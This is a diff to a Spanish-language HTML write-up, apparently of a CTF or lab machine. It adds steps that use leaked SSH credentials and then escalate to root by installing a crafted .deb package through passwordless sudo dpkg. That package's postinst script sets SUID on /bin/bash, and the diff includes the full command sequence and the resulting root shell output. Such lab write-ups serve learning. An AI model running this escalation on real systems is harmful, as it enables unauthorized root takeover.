@@ -184,16 +184,75 @@ python3 jwt_tool.py \
             administrador funcionó:
         </p>
         <img src="../Assets/jason/12.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="acceso admin con cookie forjada">
+        
+        <h3 class="text-xl font-semibold mb-2 mt-6">4) Acceso SSH y escalada a root</h3>
+        <p class="text-gray-300 mb-4">
+            El token forjado no solo permitió el acceso admin en el panel web, sino que reveló
+            credenciales de acceso SSH:
+        </p>
+        <pre><code class="language-text">
+        User: jason
+        Password: webtoken
+        </code></pre>
+        <img src="../Assets/jason/9-ssh-creds.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="credenciales SSH reveladas">
+
+        <p class="text-gray-300 mt-4">
+            Ya con shell como <code>jason</code>, se revisaron los permisos de sudo:
+        </p>
+        <pre><code class="language-bash">
+        jason@6288d4ec1441:~$ sudo -l
+        Matching Defaults entries for jason on 6288d4ec1441:
+            env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, use_pty
+        User jason may run the following commands on 6288d4ec1441:
+            (ALL) NOPASSWD: /usr/bin/dpkg
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            <code>dpkg</code> sin restricciones permite instalar un paquete <code>.deb</code> malicioso
+            cuyo script <code>postinst</code> se ejecuta como root durante la instalación
+            (técnica documentada en GTFOBins):
+        </p>
+        <pre><code class="language-bash">
+        mkdir -p /tmp/x/DEBIAN
+        echo -e '#!/bin/sh\nchmod +s /bin/bash' > /tmp/x/DEBIAN/postinst
+        chmod +x /tmp/x/DEBIAN/postinst
+
+        cat > /tmp/x/DEBIAN/control << 'EOF'
+        Package: x
+        Version: 1.0
+        Architecture: all
+        Maintainer: x
+        Description: x
+        EOF
+
+        dpkg-deb --build /tmp/x /tmp/x.deb
+        sudo dpkg -i /tmp/x.deb
+        /bin/bash -p
+        </code></pre>
+        <img src="../Assets/jason/10-dpkg-root.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="escalada a root vía dpkg">
+
+        <p class="text-gray-300 mt-4">
+            El <code>postinst</code> le agregó el bit SUID a <code>/bin/bash</code>, y al ejecutarla con
+            <code>-p</code> se obtuvo una shell con privilegios de root:
+        </p>
+        <pre><code class="language-bash">
+        bash-5.2# id
+        uid=1000(jason) gid=1000(jason) euid=0(root) egid=0(root) groups=0(root),1000(jason)
+        bash-5.2# whoami
+        root
+        </code></pre>
+    
+    
     </section>
 
     <!-- Resultado final -->
     <section class="mb-8">
         <h2 class="text-2xl font-semibold mb-2">🏆 Resultado</h2>
         <p class="text-gray-300">
-            <!-- TODO: completar qué se obtuvo tras el acceso admin (flag, panel, RCE, etc.) -->
-            Se logró escalar privilegios de invitado a administrador combinando dos fallas de
-            implementación JWT: confusión de algoritmo RS256/HS256 usando la clave pública como
-            secreto, y un secreto HMAC débil crackeable por diccionario.
+            Se obtuvo acceso root confirmado con <code>whoami</code>, combinando tres fallas encadenadas:
+            confusión de algoritmo RS256/HS256, secreto HMAC débil crackeable por diccionario, y un
+            binario <code>dpkg</code> sin restricciones en sudoers explotado vía GTFOBins.
+            No se encontró flag en <code>/root</code>.
         </p>
     </section>
 
